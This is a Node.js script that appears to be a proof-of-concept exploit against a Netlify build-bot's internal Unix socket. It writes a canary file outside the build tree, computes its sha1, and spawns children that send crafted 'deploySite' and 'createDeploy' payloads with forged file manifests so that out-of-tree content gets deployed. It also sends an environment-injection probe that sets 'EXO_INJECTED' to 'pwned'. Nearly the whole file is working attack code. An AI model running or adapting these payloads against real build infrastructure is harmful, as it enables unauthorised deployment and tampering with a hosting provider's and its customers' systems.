const net=require('net'),fs=require('fs'),cp=require('child_process'),crypto=require('crypto');
fs.mkdirSync('pub',{recursive:true}); fs.writeFileSync('pub/index.html','ok'); fs.mkdirSync('/tmp/exomark',{recursive:true});
// benign out-of-tree file + its REAL sha1 (Netlify deploy digests are sha1 of content)
const CONTENT='EXO-MANIFEST-BYPASS-'+process.pid;
fs.writeFileSync('/tmp/exomark/canary.txt',CONTENT);
const SHA1=crypto.createHash('sha1').update(CONTENT).digest('hex');
process.stdout.write('CANARY_CONTENT='+CONTENT+'  SHA1='+SHA1+'\n');
let SOCK='/tmp/netlify-buildbot-socket';
const CHILD=[
 "const net=require('net');",
 "const TAG=process.env.TAG,PAYLOAD=process.env.PAYLOAD,SOCK=process.env.SOCK;",
 "let printed=false;",
 "const P=(d)=>{if(printed)return;printed=true;process.stdout.write('RESP['+TAG+']='+d+String.fromCharCode(10));try{s.destroy()}catch(e){};process.exit(0)};",
 "const s=net.createConnection({path:SOCK});",
 "s.on('connect',()=>s.write(PAYLOAD));",
 "s.on('data',d=>P(d.toString()));",
 "s.on('error',e=>P('ERR '+e.message));",
 "s.on('close',()=>P('(closed)'));",
 "setTimeout(()=>P('(timeout)'),4000);"
].join('\n');
const dir='/tmp/exomark';
const P=[
 // supply the manifest as `files` (path -> sha1) alongside the out-of-tree deployDir
 ['files_map', {action:'deploySite',deployDir:dir,environment:[],files:{'canary.txt':SHA1}}],
 // alt field name `manifest`
 ['manifest_map', {action:'deploySite',deployDir:dir,environment:[],manifest:{'canary.txt':SHA1}}],
 // alt: full-path key
 ['files_slash', {action:'deploySite',deployDir:dir,environment:[],files:{'/canary.txt':SHA1}}],
 // createDeploy w/ manifest
 ['create_files', {action:'createDeploy',deployDir:dir,environment:[],files:{'canary.txt':SHA1}}],
 // env injection probe (bonus)
 ['env_inject', {action:'deploySite',deployDir:'/tmp/empty',environment:[{key:'EXO_INJECTED',value:'pwned',is_secret:false,scopes:['functions','runtime']}]}]
];
process.stdout.write('=====SOCK-START=====\n');
for(const [tag,obj] of P){
  cp.spawnSync(process.execPath,['-e',CHILD],{env:Object.assign({},process.env,{TAG:tag,PAYLOAD:JSON.stringify(obj),SOCK:SOCK}),stdio:['ignore','inherit','inherit']});
}
process.stdout.write('=====SOCK-END=====\n');
